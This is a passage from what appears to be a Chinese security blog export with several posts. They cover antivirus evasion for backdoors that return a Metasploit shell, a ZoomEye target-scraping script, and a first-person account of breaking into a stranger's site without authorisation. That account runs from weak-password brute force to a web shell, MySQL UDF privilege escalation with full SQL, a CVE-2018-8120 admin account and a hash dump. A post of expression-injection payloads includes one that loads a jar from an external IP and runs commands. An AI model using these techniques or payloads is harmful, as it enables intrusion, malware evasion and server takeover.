在程序output文件夹下的bat上传到 https://www.virustotal.com 被360查杀，但是能过江民，F-Secure，和国内其他家杀软 同样用msf监听执行情况，可以收到shell 以上文件在电脑管家和火绒环境下，静态查毒或者运行都不查杀。 在采用Create Fud 100% Backdoor with Fudwin 1.0中的Powerstager 0.2.5 by z0noxz (powershell)生成exe文件，再用upx加壳 Upx -7 aaa.exe 这个结果还算是能看，能查杀基本完全脱离国内杀软了 不过值得一提的就是上午电脑管家还不能查杀，下午就全国联保了，应该是上传可疑文件云端检测了，不过既然没有查杀也没有报可疑，为什么会上传检测，倒是一个问题。","categories":[],"tags":[{"name":"web安全","slug":"web安全","permalink":"/tags/web安全/"}]},{"title":"zoomeye接口实现","slug":"zoomeye接口实现","date":"2018-09-18T04:44:29.000Z","updated":"2018-09-20T04:35:56.085Z","comments":true,"path":"2018/09/zoomeye接口实现/","link":"","permalink":"/2018/09/zoomeye接口实现/","excerpt":"","text":"zoomeye的接口网上不少人做过实现，之前在学python的json信息处理，便写了这个一个利用脚本，唯一的坑就是wiki和返回信息不一样，浪费了点时间。没有多少难度，就是写了不少提示符，用来多次和提示输入。 #coding:utf-8 #author:misaki import requests import json import re def geturl(): app = raw_input(&#39;app:&#39;) app2 = input(&#39;page:&#39;) app3 = raw_input(&#39;country:&#39;) for i in xrange(1,app2+1): i=str(i) url=&#39;https://api.zoomeye.org/web/search?query=app:&#39;+app+&#39;&amp;page=&#39;+i+&#39;&amp;country=&#39;+app3 r2=requests.get(url,headers=headers) soup = r2.text a=json.loads(soup) #获取site for i in a[&#39;matches&#39;]: f=open(app+&#39;.txt&#39;,&#39;a&#39;) f.write(str(i[&#39;site&#39;])+&#39;\\n&#39;) f.close print &#39;All url number: %s&#39; % len(open(r&quot;web.txt&quot;, &#39;rU&#39;).readlines()) print &#39;\\r&#39; zoom = raw_input(&#39;Are you continue?[y/n]:&#39;) print &#39;\\r&#39; while zoom not in [&#39;y&#39;,&#39;n&#39;,&#39;Y&#39;,&#39;N&#39;]: print &quot;Please enter the specified letter!&quot; zoom = raw_input(&#39;Are you continue?[y/n]:&#39;) print &#39;\\r&#39; if zoom in [&#39;y&#39;,&#39;Y&#39;]: main() def getip(): app4 = raw_input(&#39;app:&#39;) app5 = input(&#39;page:&#39;) app6 = raw_input(&#39;country:&#39;) for i in xrange(1, app5 + 1): i = str(i) url = &#39;https://api.zoomeye.org/host/search?query=&#39; + app4 + &#39;&amp;page=&#39; + i +&#39;&amp;country=&#39; + app6 r2 = requests.get(url, headers=headers) parrten = re.compile(r&#39;(?&lt;![\\.\\d])(?:\\d{1,3}\\.){3}\\d{1,3}(?![\\.\\d])&#39;) #获取ip ip = parrten.findall(str(r2.text)) for i in ip: f = open(app4+&#39;.txt&#39;, &#39;a&#39;) f.write(str(i) + &#39;\\n&#39;) f.close print &#39;All url number: %s&#39; % len(open(r&quot;host.txt&quot;, &#39;rU&#39;).readlines()) print &#39;\\r&#39; zoom = raw_input(&#39;Are you continue?[y/n]:&#39;) while zoom not in [&#39;y&#39;,&#39;n&#39;,&#39;Y&#39;,&#39;N&#39;]: print &quot;Please enter the specified letter!&quot; zoom = raw_input(&#39;Are you continue?[y/n]:&#39;) print &#39;\\r&#39; if zoom in [&#39;y&#39;,&#39;Y&#39;]: main() def getuser(): url = &#39;https://api.zoomeye.org/resources-info&#39; r2 = requests.get(url, headers=headers) soup = json.loads(r2.text) print &#39;\\r&#39; print &#39;plan: %s&#39; %soup[&#39;plan&#39;] print &#39;search_num: %s&#39; %soup[&#39;resources&#39;][&#39;search&#39;] print &#39;stats: %s&#39; %soup[&#39;resources&#39;][&#39;stats&#39;] def main(): print &#39;Input service number&#39; print &#39;1 - web_search&#39; print &#39;2 - host_search&#39; print &#39;3 - resources_info&#39; name = raw_input(&#39;input num:&#39;) print &#39;\\r&#39; while name not in [&#39;1&#39;,&#39;2&#39;,&#39;3&#39;]: name = raw_input(&#39;input num:&#39;) if name != &#39;&#39;: try: if name == &#39;1&#39;: geturl() elif name == &#39;2&#39;: getip() elif name == &#39;3&#39;: getuser() except: pass if __name__==&#39;__main__&#39;: print &#39;#######&#39; print &#39; # #### #### # # ###### # # ######&#39; print &#39; # # # # # ## ## # # # # &#39; print &#39; # # # # # # ## # ##### # ##### &#39; print &#39; # # # # # # # # # # &#39; print &#39; # # # # # # # # # # &#39; print &#39;####### #### #### # # ###### # ######&#39; print &#39;auther:misaki&#39; print &#39;\\r&#39; print &#39;Input your username and password&#39; username = raw_input(&#39;username:&#39;) password = raw_input(&#39;password:&#39;) print &#39;\\r&#39; if username and password != -1: data = {&quot;username&quot;: username, &quot;password&quot;: password} s = json.dumps(data, indent=4) r = requests.post(&#39;https://api.zoomeye.org/user/login&#39;, data=s) if r.status_code == 200: token = r.text headers = {&#39;Authorization&#39;: &#39;JWT&#39; + &#39; &#39; + token[18:-2]} main() else: print &#39;Incorrect username or password&#39; ​​","categories":[],"tags":[{"name":"python","slug":"python","permalink":"/tags/python/"}]},{"title":"对意外发现的某站点测试","slug":"对意外发现的某站点测试","date":"2018-09-18T04:43:59.000Z","updated":"2018-09-20T04:37:09.019Z","comments":true,"path":"2018/09/对意外发现的某站点测试/","link":"","permalink":"/2018/09/对意外发现的某站点测试/","excerpt":"","text":"朋友分享一个站点，点开需要购买点卡，本着节约的原则，简单做了一个测试，于是便有了下文 爆破宝塔系统，页面提示三次错误将出现验证码，那么如何记录错误次数，猜测是通过cookie，删除cookie 弱口令爆破成功，进入宝塔后台 从宝塔后台获取phpmyadmin，root权限 同样可以看到文件系统，但只能看到网站目录，宝塔系统提示，从宝塔建站，默认user权限 上传shell，同样是只能看到当前网站目录 考虑通过phpmyadmin提权，发现系统禁止root外连，虽然没有必要，但还是尝试开启外连，用navicat连接数据库接管，用户中找到root用户，编辑权限，开启任意主机链接 采用udf提权，提权的话需要写入导出权限，但是由于权限设置不能导入导出 因为mysql对通过文件导入导出作了限制，默认不允许。默认value值为null，则为禁止，如果有文件夹目录，则只允许改目录下文件 通常操作为以下步骤，但是没有写权限，有了上传权限更方便操作，直接跳过udf导出步骤： Udf需要导出到\\lib\\plugin目录，一般该目录不存在\\lib\\plugin目录。 可以尝试利用NTFS ADS创建 plugin目录 查询 select &#39;xxx&#39; into dumpfile &#39;C:\\\\MySQL\\\\lib::$INDEX_ALLOCATION&#39;; 导出UDF.DLL 随便选一个库 查询 CREATE TABLE Temp_udf(udf BLOB); 查询 INSERT into Temp_udf values (CONVERT($shellcode,CHAR)); 查询 SELECT udf FROM Temp_udf INTO DUMPFILE &#39;C:\\\\MySQL\\\\lib\\\\plugin\\\\udf.dll&#39;;-- 查询 Create function cmdshell returns string soname &#39;udf.dll&#39;; 查询 select * from mysql.func; 查询 select cmdshell(&#39;net user test test /add&#39;); ​ 手动创建plugin目录，上传udf.dll文件，执行以上sql代码，创建账号，拿下服务器 利用Cve-2018-8120创建账号完成添加管理员 导出hash，利用Pwdump7 这个过程遇到一个问题就是，菜刀下模拟终端无法使用，目录只能看到网站目录，导致一段时间内以为是权限问题，而磁盘下的目录又只是一个网站目录，加深这种认识，拿下服务器的时候才发现是想多了，只有那一个目录。。。","categories":[],"tags":[{"name":"渗透测试","slug":"渗透测试","permalink":"/tags/渗透测试/"}]},{"title":"表达式注入","slug":"表达式注入","date":"2018-09-18T04:29:45.000Z","updated":"2018-09-20T04:36:56.198Z","comments":true,"path":"2018/09/表达式注入/","link":"","permalink":"/2018/09/表达式注入/","excerpt":"","text":"在一次项目中发现了一个泛微的历史老洞，而且是表达式注入中典型的一种，特地收集了相关资料做一份表达式注入的文档和记录 表达式注入概念：2013年4月15日Expression Language Injection词条在OWASP上被创建，而这个词的最早出现可以追溯到2012年12月的《Remote-Code-with-Expression-Language-Injection》一文，在这个paper中第一次提到了这个名词。 而这个时期，只不过还只是把它叫做远程代码执行漏洞、远程命令执行漏洞或者上下文操控漏洞。像Struts2系列的s2-003、s2-009、s2-016等，这种由OGNL表达式引起的命令执行漏洞。 流行的表达式语言：Struts2——OGNL实至名归的“漏洞之王”，表达式的格式: ​ @[类全名（包括包路径）]@[方法名 | 值名]，例如： ​ @java.lang.String@format(&#39;foo %s&#39;, &#39;bar&#39;) 基本用法： java ActionContext AC = ActionContext.getContext(); Map Parameters = (Map)AC.getParameters(); String expression = &quot;${(new java.lang.ProcessBuilder(&#39;calc&#39;)).start()}&quot;; AC.getValueStack().findValue(expression)); 相关漏洞： s2-009、s2-012、s2-013、s2-014、s2-015、s2-016，s2-017 Spring——SPELSPEL即Spring EL，故名思议是Spring框架专有的EL表达式。相对于其他几种表达式语言，使用面相对较窄，但是从Spring框架被使用的广泛性来看，还是有值得研究的价值的。 基本用法： 在jsp页面中可以使用el表达式代替&lt;%=%&gt;，之间访问java对象。 java String expression = &quot;T(java.lang.Runtime).getRuntime().exec(/&quot;calc/&quot;)&quot;; String result = parser.parseExpression(expression).getValue().toString(); JSP——JSTL_EL这种表达式是JSP语言自带的表达式，也就是说所有的Java Web服务都必然会支持这种表达式。但是由于各家对其实现的不同，也导致某些漏洞可以在一些Java Web服务中成功利用，而在有的服务中则是无法利用。 基本用法： jsp &lt;spring:message text=&quot;${/&quot;/&quot;.getClass().forName(/&quot;java.lang.Runtime/&quot;).getMethod(/&quot;getRuntime/&quot;,null).invoke(null,null).exec(/&quot;calc/&quot;,null).toString()}&quot;&gt; &lt;/spring:message&gt; Elasticsearch——MVELElasticsearch的CVE-2014-3120这个漏洞 MVEL是同OGNL和SPEL一样，具有通过表达式执行Java代码的强大功能。 基本用法： java import org.mvel.MVEL; public class MVELTest { ​ public static void main(String[] args) { ​ String expression = &quot;new java.lang.ProcessBuilder(/&quot;calc/&quot;).start();&quot;; ​ Boolean result = (Boolean) MVEL.eval(expression, vars); ​ } } 执行代码：OGNL表达式注入：示例：泛微E-Mobile 表达式获取数据语法：”${标识符}”，但在这个中并不需要${}来包括，不然会执行失败。 先用一个小的加减乘除做验证： 执行exp语句，执行命令whoami， @org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%27whoami%27).getInputStream())： 尝试报路径，但此例并不成功 %24%7B%23req%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletRequest%27%29%2C%23a%3D%23req.getSession%28%29%2C%23b%3D%23a.getServletContext%28%29%2C%23c%3D%23b.getRealPath%28%22%2F%22%29%2C%23matt%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29%2C%23matt.getWriter%28%29.println%28%23c%29%2C%23matt.getWriter%28%29.flush%28%29%2C%23matt.getWriter%28%29.close%28%29%7D EL表达式注入：​ 实例：CVE-2011-2730 EL表达式语句在执行时，会调用pageContext.findAttribute方法，用标识符为关键字，分别从page、request、session、application四个域中查找相应的对象，找到则返回相应对象，找不到则返回”” （注意，不是null，而是空字符串）。 EL表达式可以很轻松获取JavaBean的属性，或获取数组、Collection、Map类型集合的数据 EL表达式语言中定义了11个隐含对象，使用这些隐含对象可以很方便地获取web开发中的一些常见对象，并读取这些对象的数据。 语法：${隐式对象名称}：获得对象的引用 序号 隐含对象名称 描述 1 pageContext 对应于JSP页面中的pageContext对象（注意：取的是pageContext对象。） 2 pageScope 代表page域中用于保存属性的Map对象 3 requestScope 代表request域中用于保存属性的Map对象 4 sessionScope 代表session域中用于保存属性的Map对象 5 applicationScope 代表application域中用于保存属性的Map对象 6 param 表示一个保存了所有请求参数的Map对象 7 paramValues 表示一个保存了所有请求参数的Map对象，它对于某个请求参数，返回的是一个string[] 8 header 表示一个保存了所有http请求头字段的Map对象，注意：如果头里面有“-” ，例Accept-Encoding，则要header[“Accept-Encoding”] 9 headerValues 表示一个保存了所有http请求头字段的Map对象，它对于某个请求参数，返回的是一个string[]数组。注意：如果头里面有“-” ，例Accept-Encoding，则要headerValues[“Accept-Encoding”] 10 cookie 表示一个保存了所有cookie的Map对象 11 initParam 表示一个保存了所有web应用初始化参数的map对象 语法：${运算表达式}，EL表达式支持如下运算符： 1、关系运算符 2、逻辑运算符： 3、empty运算符：检查对象是否为null(空) 4、二元表达式：${user!=null?user.name :””} 5、[ ] 和 . 号运算符 执行exp语句： ${pageContext.request.getSession().setAttribute(&quot;a&quot;,pageContext.request.getClass().forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;,null).invoke(null,null).exec(&quot;命令&quot;).getInputStream())} Primefaces框架表达式注入:Primefaces要加密Payload后执行命令，所以这里用打包成jar包的加密函数进行加密! 命令：java -cp .\\de.jar test.EncodeDecode exp 验证(代码): ${facesContext.getExternalContext().getResponse().getWriter().println(&quot;~~~elinject~~~&quot;)}${facesContext.getExternalContext().getResponse().getWriter().flush()}${facesContext.getExternalContext().getResponse().getWriter().close()} 加密的Payload: uMKljPgnOTVxmOB+H6/QEPW9ghJMGL3PRdkfmbiiPkV9XxzneUPyMM8BUxgtfxF3wYMlt0MXkqO5+OpbBXfBSKlTh7gJWI1HR5e/f4ZjcLzobfbDkQghTWQVAXvhdUc8D7M8Nnr+gSpk0we/YPtcrOOmI+/uuxl31mfOtFvEWGE3AUZFGxpmyfyMuGL0rzVw3wUpjUlHw4k3O4pm1RrCJT/PxEtCs00U9EBM2okSaAdPIn9p9G5X3lwi6lN7MXvoBhoFVy+31JzmoVeaZattVJhqvZRs1fguZGDCqQaJe+c6rQmcZWEKQg== Web路径: ${facesContext.getExternalContext().getResponse().getWriter().println(request.getSession().getServletContext().getRealPath(/&quot;//&quot;))}${facesContext.getExternalContext().getResponse().getWriter().flush()}${facesContext.getExternalContext().getResponse().getWriter().close()} 加密的Payload: uMKljPgnOTVxmOB%2BH6%2FQEPW9ghJMGL3PRdkfmbiiPkV9XxzneUPyMM8BUxgtfxF3wYMlt0MXkqO5%2BOpbBXfBSCSkb2z5x8Cb2P%2FDS2BUn7odA0GflWHV%2B9J8uLGYIqPK9HY85O%2BJw0u5X9urorJfQZKJihsLCV%2BnqyXHs8i6uh4iIboLA2TZUiTbjc3SfybUTvPCjRdyT6rCe6MPQGqHYkBiX3K7fGPuwJ2XNONXI9N2Sup5MWcUUo87FbX3jESvOq2Bs3sDKU4bW3aCGbhUcA2ZEgSxkLcW6VKDnXV5hxvz6J4a4E6P8HCy9v8%2BdrRzmtKbwczXk%2B9n8Lm2KYS%2Fk2TJKpeKjPg0t%2BAiKzTiqak%3D 反射式调用执行命令: ${request.getSession().setAttribute(&quot;list&quot;,&quot;&quot;.getClass().forName(&quot;java.util.ArrayList&quot;).newInstance())}${request.getSession().getAttribute(&quot;list&quot;).add(request.getSession().getServletContext().getResource(&quot;/&quot;).toURI().create(&quot;http://118.184.23.145/cmd.jar&quot;).toURL())}${facesContext.getExternalContext().getResponse().getWriter().println(request.getSession().getClass().getClassLoader().getParent().newInstance(request.getSession().getAttribute(&quot;list&quot;).toArray(request.session.servletContext.getClass().getClassLoader().getParent().getURLs())).loadClass(&quot;org.javaweb.test.HelloWorld&quot;).newInstance().exec(request.getParameter(&quot;cmd&quot;)))}${facesContext.getExternalContext().getResponse().getWriter().flush()}${facesContext.getExternalContext().getResponse().getWriter().close()} 加密的Payload调用: http://xx.xx.xx.xx/javax.faces.resource/?pfdrt=sc&amp;;ln=primefaces&amp;;pfdrid=1acBqv16SJhfc30NLxL/NinZaDI%2BoHqk1xDbSI8qOl4%2BoXsKFyqJq3gv2IBc1S89q6G1POSSKDNlzHE/%2BnsMuZgTDALpyOstkBkFVJNc2U/B%2BoceOqnpF5YZoWtF0W7qGxsImsumut7GQoKKMQcbwwL4coE07x6Mn09hfy94tuiiy6S8S1vr8kPPYzrUC5AveiE9ls7dLDiaQripnC0Z71fB1xCjkxw8wjZt3om1PT9Wq8YAqkHuBIo/soFBvM1YDnJosELhjmfoJdAGBRfullXUfVw5xEg9ykFpLaKugkbDIBgXtv58Xu4BrT0d5MAQ8BOVwjzSodkdllYCAeUklCDWRfFtZDORdcAzXVxTRkEn%2Bnx7qAFh8NwK/sDsXz6U1Q2Q/ny1UaEMFM9qrgVmfX181HXWc4TuETxLqUohfreYLJLW%2BAxcxzciqqoKj%2Bht/KJ%2B%2BGfzuNoSs0E9i9N/AL5PALrdTRg%2BuweD3CMLZgLDITkMx4z7dmP2daw2B98nrKOLHtG6nYDcDmSfy8d8IKMZJvuq/WT7JLm0PJ3UqDyvzHHjrPCDpTFhMUmftFFvi4APBpT41slHYoRKDbJMvU/upvKyAsy5xQKJ5s6x%2B4F%2By9p8Icp1TQfMcqIPwMQkvsOs8i61m6i96dpmxpfZPWprcigaWMhJG8/iYRg7ZygegrmSbovLy5Tr3Mc9GODgdTx7v396NJ75yQyU4ETmYEhNxWTIoncK7MbyBcIWR/h1GjhCwwpquKRWLb3hal8DNJxubaKnxGa9mRNaQAZRr0s%2B3eo1jeino5O8CSQzla7ACpJc3867AAGxnWrnE/weJ20W3QKj6nIz/EAyx87aVIKs%2BQH3O4IGx%2BuiZ38TvMeg6jZpkZGiRNEUEuAoV6CWlMA%2BxM6BPvbPyWsqmdI8l%2ByFBhsoSpNhel2%2B0gxS5wWqZbRyi0rjPlOzUe8Xir9mlpuBZzrUIcbaYaE8PHQno1OZ/zaHx/GzAJakSRQ5YbKQ/W/OzkokDG3M79KSCtx2jN92PtISucY%3D&amp;;cmd=ifconfig Spring Boot框架表达式注入漏洞影响Spring Boot版本从1.1-1.3.0 http://localhost:8555/test.php?id=${new%20java.lang.String(new%20byte[]{101, 108, 105, 110, 106, 101, 99, 116 })} 内容中出现 elinject就是注入成功","categories":[],"tags":[{"name":"web安全","slug":"web安全","permalink":"/tags/web安全/"}]},{"title":"新的开始！","slug":"新的开始！","date":"2018-09-17T16:32:10.000Z","updated":"2019-03-12T02:57:01.176Z","comments":true,"path":"2018/09/新的开始！/","link":"","permalink":"/2018/09/新的开始！/","excerpt":"","text":"记录自己某些时候的学习，和某些突发奇想。简而言之就是为了防止忘记某些自己需要的东西。","categories":[],"tags":[]}]}